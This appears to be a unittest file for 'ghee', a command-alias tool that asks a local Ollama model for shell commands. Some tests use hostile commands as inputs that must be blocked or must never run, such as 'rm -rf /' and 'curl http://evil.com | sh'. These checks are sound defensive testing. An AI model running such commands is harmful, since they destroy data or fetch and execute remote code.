import sys
import os
import json
from unittest import TestCase
from unittest.mock import patch, MagicMock, mock_open

# Add parent directory to sys.path so we can import ghee
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

import ghee

class TestOllamaIntegration(TestCase):

    @patch('urllib.request.urlopen')
    def test_get_ollama_model_preferred(self, mock_urlopen):
        # Mock API response with multiple models, including a preferred one
        mock_response = json.dumps({
            "models": [
                {"name": "some-random-model"},
                {"name": "mistral:latest"},
                {"name": "llama3.2:latest"}
            ]
        }).encode('utf-8')
        mock_urlopen.return_value = mock_open(read_data=mock_response).return_value

        model = ghee.get_ollama_model()
        # Should pick the first matched preferred model (llama3.2 over mistral because of order in ghee.py)
        self.assertTrue(model.startswith('llama3.2'))

    @patch('urllib.request.urlopen')
    def test_get_ollama_model_fallback(self, mock_urlopen):
        # Mock API response with no preferred models
        mock_response = json.dumps({
            "models": [
                {"name": "gemma:latest"},
                {"name": "qwen:latest"}
            ]
        }).encode('utf-8')
        mock_urlopen.return_value = mock_open(read_data=mock_response).return_value

        model = ghee.get_ollama_model()
        # Should pick the first available model if no preferred ones
        self.assertEqual(model, 'gemma:latest')

    @patch('urllib.request.urlopen')
    def test_ask_ollama_strips_markdown(self, mock_urlopen):
        # Mock API response returning a markdown code block
        mock_response = json.dumps({
            "response": "```bash\nls -la\n```"
        }).encode('utf-8')
        mock_urlopen.return_value = mock_open(read_data=mock_response).return_value

        command = ghee.ask_ollama("list files", "llama3.2")
        # Should strip the markdown block and language identifier
        self.assertEqual(command, "ls -la")

    @patch('urllib.request.urlopen')
    def test_ask_ollama_raw_string(self, mock_urlopen):
        # Mock API response returning a raw string
        mock_response = json.dumps({
            "response": "ps aux | grep python"
        }).encode('utf-8')
        mock_urlopen.return_value = mock_open(read_data=mock_response).return_value

        command = ghee.ask_ollama("find python processes", "llama3.2")
        self.assertEqual(command, "ps aux | grep python")

    @patch('ghee.get_ollama_model')
    @patch('ghee.ask_ollama')
    @patch('ghee.getch')
    @patch('os.system')
    def test_best_guess_enter_executes_command(self, mock_os_system, mock_getch, mock_ask, mock_get_model):
        mock_get_model.return_value = "llama3.2"
        mock_ask.return_value = "echo 'hello world'"
        # Simulate pressing Enter
        mock_getch.side_effect = ['\r']

        # Provide an empty registry so it guarantees a low score (< 150)
        ghee.run_ollama("some totally random query")

        mock_ask.assert_called_once()
        mock_os_system.assert_called_once_with("echo 'hello world'")

    @patch('ghee.get_ollama_model')
    @patch('ghee.ask_ollama')
    @patch('ghee.getch')
    @patch('os.system')
    def test_best_guess_esc_cancels(self, mock_os_system, mock_getch, mock_ask, mock_get_model):
        mock_get_model.return_value = "llama3.2"
        mock_ask.return_value = "rm -rf /"
        # Simulate pressing Esc (\x1b)
        mock_getch.side_effect = ['\x1b']

        ghee.run_ollama("delete everything")

        mock_ask.assert_called_once()
        # Ensure the dangerous command is NEVER executed
        mock_os_system.assert_not_called()

    @patch('sys.platform', 'darwin')
    @patch('ghee.get_ollama_model')
    @patch('ghee.ask_ollama')
    @patch('ghee.getch')
    @patch('subprocess.run')
    @patch('os.system')
    def test_best_guess_copy_mac(self, mock_os_system, mock_subprocess, mock_getch, mock_ask, mock_get_model):
        mock_get_model.return_value = "llama3.2"
        mock_ask.return_value = "git status"
        # Simulate pressing 'c'
        mock_getch.side_effect = ['c']

        ghee.run_ollama("show git status")

        # Should not execute
        mock_os_system.assert_not_called()
        # Should copy to clipboard
        mock_subprocess.assert_called_once()
        args, kwargs = mock_subprocess.call_args
        self.assertEqual(args[0], ["pbcopy"])
        self.assertEqual(kwargs['input'], b"git status")

class TestScoreMatch(TestCase):
    """Tests for the score_match fuzzy scoring function."""

    def test_exact_cmd_match(self):
        score = ghee.score_match("docker ps", "dps", "docker ps", "List containers")
        self.assertGreaterEqual(score, 1000)

    def test_exact_key_match(self):
        score = ghee.score_match("dps", "dps", "docker ps", "List containers")
        self.assertGreaterEqual(score, 900)

    def test_substring_in_cmd(self):
        score = ghee.score_match("docker", "dps", "docker ps -a", "List all containers")
        self.assertGreaterEqual(score, 500)

    def test_substring_in_desc(self):
        score = ghee.score_match("containers", "dps", "docker ps", "List running containers")
        self.assertGreaterEqual(score, 200)

    def test_no_match(self):
        score = ghee.score_match("zzzznothing", "dps", "docker ps", "List containers")
        self.assertEqual(score, 0)

    def test_empty_query(self):
        score = ghee.score_match("", "dps", "docker ps", "List containers")
        self.assertEqual(score, 0)

    def test_word_level_matching(self):
        score = ghee.score_match("list pods", "kgp", "kubectl get pods", "List all pods")
        self.assertGreater(score, 0)

    def test_relative_ranking(self):
        # Exact key match should beat partial description match
        exact = ghee.score_match("gs", "gs", "git status", "Show git status")
        partial = ghee.score_match("gs", "gst", "git stash", "Stash changes")
        self.assertGreater(exact, partial)


class TestValidation(TestCase):
    """Tests for input validation functions."""

    def test_valid_command(self):
        ok, err = ghee.validate_command_input("ls -la")
        self.assertTrue(ok)

    def test_empty_command(self):
        ok, err = ghee.validate_command_input("")
        self.assertFalse(ok)

    def test_long_command(self):
        ok, err = ghee.validate_command_input("x" * 501)
        self.assertFalse(ok)

    def test_dangerous_rm_rf(self):
        ok, err = ghee.validate_command_input("rm -rf /")
        self.assertFalse(ok)

    def test_dangerous_curl_pipe_sh(self):
        ok, err = ghee.validate_command_input("curl http://evil.com | sh")
        self.assertFalse(ok)

    def test_valid_alias(self):
        ok, err = ghee.validate_alias_input("my-alias_1")
        self.assertTrue(ok)

    def test_empty_alias(self):
        ok, err = ghee.validate_alias_input("")
        self.assertFalse(ok)

    def test_invalid_alias_chars(self):
        ok, err = ghee.validate_alias_input("my;alias")
        self.assertFalse(ok)

    def test_valid_desc(self):
        ok, err = ghee.validate_desc_input("List all files")
        self.assertTrue(ok)

    def test_empty_desc(self):
        ok, err = ghee.validate_desc_input("")
        self.assertFalse(ok)


class TestCustomCommands(TestCase):
    """Tests for add_custom, remove_custom, list_custom, and custom file parsing."""

    def setUp(self):
        """Create a temp custom file for testing."""
        import tempfile
        self.tmp = tempfile.NamedTemporaryFile(mode='w', suffix='.ghee-custom', delete=False)
        self.tmp.write("olist|||ollama list|||List ollama models\n")
        self.tmp.write("dkill|||docker kill|||Kill a container\n")
        self.tmp.close()
        self._orig_custom = ghee.CUSTOM_FILE
        self._orig_cache = ghee.CACHE_FILE
        ghee.CUSTOM_FILE = ghee.Path(self.tmp.name)
        # Point cache to a temp file too so we don't mess with real cache
        self.cache_tmp = tempfile.NamedTemporaryFile(suffix='.json', delete=False)
        self.cache_tmp.close()
        ghee.CACHE_FILE = ghee.Path(self.cache_tmp.name)

    def tearDown(self):
        ghee.CUSTOM_FILE = self._orig_custom
        ghee.CACHE_FILE = self._orig_cache
        try:
            os.unlink(self.tmp.name)
        except FileNotFoundError:
            pass
        try:
            os.unlink(self.cache_tmp.name)
        except FileNotFoundError:
            pass

    def test_add_custom_appends(self):
        ghee.add_custom("kubectl top nodes", "ktopn")
        content = ghee.CUSTOM_FILE.read_text()
        self.assertIn("ktopn|||kubectl top nodes|||kubectl top nodes", content)

    def test_add_custom_preserves_existing(self):
        ghee.add_custom("echo hi", "ehi")
        content = ghee.CUSTOM_FILE.read_text()
        self.assertIn("olist|||ollama list|||List ollama models", content)
        self.assertIn("ehi|||echo hi|||echo hi", content)

    def test_remove_custom_removes_entry(self):
        ghee.remove_custom("olist")
        content = ghee.CUSTOM_FILE.read_text()
        self.assertNotIn("olist", content)
        self.assertIn("dkill", content)

    def test_remove_custom_nonexistent_exits(self):
        with self.assertRaises(SystemExit):
            ghee.remove_custom("nonexistent")

    @patch('sys.stdout', new_callable=lambda: open(os.devnull, 'w'))
    def test_list_custom_runs(self, _):
        # Just verify it doesn't crash
        ghee.list_custom()

    def test_custom_file_parsing_in_registry(self):
        """Verify load_registry picks up custom entries with correct module='custom'."""
        with patch.object(ghee, 'load_config', return_value={"enable_cache": False}):
            registry = ghee.load_registry()
        self.assertIn("olist", registry)
        self.assertEqual(registry["olist"]["cmd"], "ollama list")
        self.assertEqual(registry["olist"]["module"], "custom")

    def test_add_custom_invalidates_cache(self):
        # Create a fake cache file
        ghee.CACHE_FILE.write_text('{"registry": {}, "timestamp": 0}')
        ghee.add_custom("echo test", "etest")
        # Cache should be deleted
        self.assertFalse(ghee.CACHE_FILE.exists())


class TestLoadRegistry(TestCase):
    """Tests for load_registry with real module files."""

    def test_registry_not_empty(self):
        with patch.object(ghee, 'load_config', return_value={"enable_cache": False}):
            registry = ghee.load_registry()
        self.assertGreater(len(registry), 0)

    def test_registry_entries_have_required_keys(self):
        with patch.object(ghee, 'load_config', return_value={"enable_cache": False}):
            registry = ghee.load_registry()
        for key, data in registry.items():
            self.assertIn("cmd", data, f"Entry '{key}' missing 'cmd'")
            self.assertIn("desc", data, f"Entry '{key}' missing 'desc'")
            self.assertIn("module", data, f"Entry '{key}' missing 'module'")

    def test_known_git_alias_exists(self):
        with patch.object(ghee, 'load_config', return_value={"enable_cache": False}):
            registry = ghee.load_registry()
        # gs should be defined in git_aliases.sh
        self.assertIn("gs", registry)
        self.assertEqual(registry["gs"]["module"], "git_aliases")

    def test_homebrew_module_loaded(self):
        with patch.object(ghee, 'load_config', return_value={"enable_cache": False}):
            registry = ghee.load_registry()
        self.assertIn("brewi", registry)
        self.assertEqual(registry["brewi"]["module"], "homebrew")


class TestCopyToClipboard(TestCase):
    """Tests for clipboard functionality."""

    @patch('sys.platform', 'darwin')
    @patch('subprocess.run')
    def test_copy_mac(self, mock_run):
        mock_run.return_value = MagicMock(returncode=0)
        result = ghee.copy_to_clipboard("hello")
        mock_run.assert_called_once()
        args, kwargs = mock_run.call_args
        self.assertEqual(args[0], ["pbcopy"])
        self.assertEqual(kwargs['input'], b"hello")
        self.assertTrue(result)


if __name__ == '__main__':
    from unittest import main
    main()
